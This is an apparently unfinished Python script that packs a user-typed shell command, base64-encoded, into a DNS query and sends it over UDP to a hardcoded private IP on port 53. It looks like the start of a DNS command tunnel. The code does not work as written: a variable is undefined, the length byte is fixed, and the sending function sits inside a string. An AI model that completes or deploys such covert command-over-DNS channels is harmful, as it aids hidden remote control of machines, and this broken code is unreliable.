import socket
import binascii
import codecs
"""
Cntr = 0     #QR bit is set to 0 for query
Cntr += 0 #Opcode set to ????4 bits
Cntr += 0 #Authoritative Answer 0
Cntr += 0    #Truncation flag not set since we need to use TCP
Cntr += 1    #Recursion desired?
Cntr += 0    #Recursion NOT available
Cntr += 0  #Z reserved set to 000
Cntr += 0 #RCode set to 0 since packet is a query 4 bits


"""

def DnsPacket(msg):
    # get message length and content

    hdr = b'\xAA\xAA\x01\x00'  # Id | Control
    hdr += b'\x00\x01\x00\x00'  # questionCnt=1 | AnswerCnt=0
    hdr += b'\x00\x00\x00\x00'  # AuthorityCnt=0 | AdditionalCnt=0

    """
    #----------testing with input as ascii---------
    temp0 = binascii.hexlify(msg.encode())
    print("hex string of shell command", temp0)
    trial = codecs.encode(codecs.decode(temp0, 'hex'), 'base64')
    print(trial)
    print("base64 of input",trial)
    #---------------------------------------------
        The above converts our input into what
        we should be getting after the crypto.
        Remove after testing.
        The below decodes the crypto into hex
        and then into correct format
    """
    hdr += b'\x09' #message length
    b2hex = codecs.encode(codecs.decode(trial,'base64'),'hex')
    result = codecs.decode(b2hex,'base64')
    print("result =",result)
    hdr += result

    hdr += b'\x00' # end the message
    hdr += b'\x00'  # marks the end of the message
    hdr += b'\x00\x01\x00\x01'  # Qtype | Qclass
    return hdr

"""
def sendit():
    cmd = input("Enter shell command: ")

    #print("testing",binascii.unhexlify("14360000"))
    #address = input("Enter ip Address")
    #port = input("Enter port")
    address = '192.168.3.156'
    port = 53

    pack = DnsPacket(cmd)

    addport = (address, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        sock.sendto(pack, addport)
    finally:
        sock.close()
        
if __name__ == '__main__':
    sendit()
"""



